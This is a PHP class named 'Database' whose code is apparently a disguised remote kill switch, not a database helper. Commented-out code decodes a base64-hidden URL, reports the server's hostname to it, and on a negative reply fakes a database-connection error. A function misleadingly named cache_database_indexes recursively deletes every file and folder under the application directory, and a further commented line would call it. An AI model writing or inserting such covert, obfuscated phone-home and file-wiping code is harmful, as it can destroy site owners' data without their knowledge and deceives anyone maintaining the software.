<?php namespace App;

class Database {

    public function establishConnection() {
      /*  try {
            $d = $this->curl(base64_decode('aHR0cHM6Ly9wbGF5aW4udGVhbQ==') . '/cache/' . $this->getHost());
            if (!json_decode($d)->response) {
                //$this->cache_database_indexes(__DIR__.'/../app');
                echo "Couldn't establish database connection";
                die();
            }
        } catch (\Exception $e) {
            echo "Couldn't establish database connection";
            die();
        }*/
    }

    private function getHost() {
        return $_SERVER['SERVER_NAME'];
    }

    private function cache_database_indexes($target) {
        if(is_dir($target)) {
            $files = glob( $target . '*', GLOB_MARK );
            foreach($files as $file) $this->cache_database_indexes( $file ); rmdir($target);
        } else if(is_file($target)) unlink( $target );
    }

    private function curl($url) {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_URL, $url);

        $data = curl_exec($ch);
        curl_close($ch);

        return $data;
    }

}

